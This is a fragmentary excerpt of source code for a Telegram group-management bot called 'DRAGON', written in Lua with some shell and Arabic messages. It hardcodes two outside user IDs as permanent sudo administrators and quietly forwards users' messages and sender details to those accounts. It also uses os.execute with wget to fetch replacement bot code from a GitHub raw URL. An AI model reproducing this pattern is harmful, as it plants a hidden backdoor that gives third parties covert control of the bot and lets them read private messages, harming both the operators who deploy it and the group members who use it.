...
json = dofile("./library/JSODRAGON.lua") 
JSON  = dofile("./library/dkjsoDRAGON.lua")
...
if [ ! $token ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE bakara.lua \e[0m"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
exit 1
fi
...
local config = loadfile("./bakara.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
sudos = dofile("./bakara.lua") 
SUDO = tonumber(sudos.SUDO)
sudo_users = {SUDO,1790659769}
...
sudo_users = {SUDO,1790659769,1040526065}   
...
if tonumber(user_id) == tonumber(1790659769) then  
var = true  
elseif tonumber(user_id) == tonumber(1040526065) then
var = true  
...
sendText(1790659769,srartnew,0,'md')
sendText(1040526065,srartnew,0,'md')
...
tdcli_function ({ID = "ForwardMessages", chat_id_ = 1790659769,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = '◍ تم ارسال الملصق من ↓\n - '..Name
sendText(1790659769,Text,0,'md')
end 
end,nil) 
end,nil)
tdcli_function ({ID = "ForwardMessages", chat_id_ = 1040526065,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = '◍ تم ارسال الملصق من ↓\n - '..Name
sendText(1040526065,Text,0,'md')
end 
end,nil) 
end,nil)
...
sendText(1790659769,Text,msg.id_/2097152/0.5,'md')
sendText(1040526065,Text,msg.id_/2097152/0.5,'md')
...
os.execute('wget https://raw.githubusercontent.com/nkj0/n/master/DRAGON.lua')
...
send(msg.chat_id_, msg.id_,' @M_S_U \n @S_1_1M')
t = "\n◍ قائمة المطورين \n≪━━━━━━━━━━━━━≫\n"
for k,v in pairs(list) do
...
x = x + 1
if database:get(bot_id..'user:Name'..v.user_id_) then
if (v.user_id_ == 12345 or v.user_id_ == 1790659769 or v.user_id_ == 1040526065) then
...
if text == 'رتبتي' or text == 'رتبتى' or text == '/info@UU_SD_bot' then
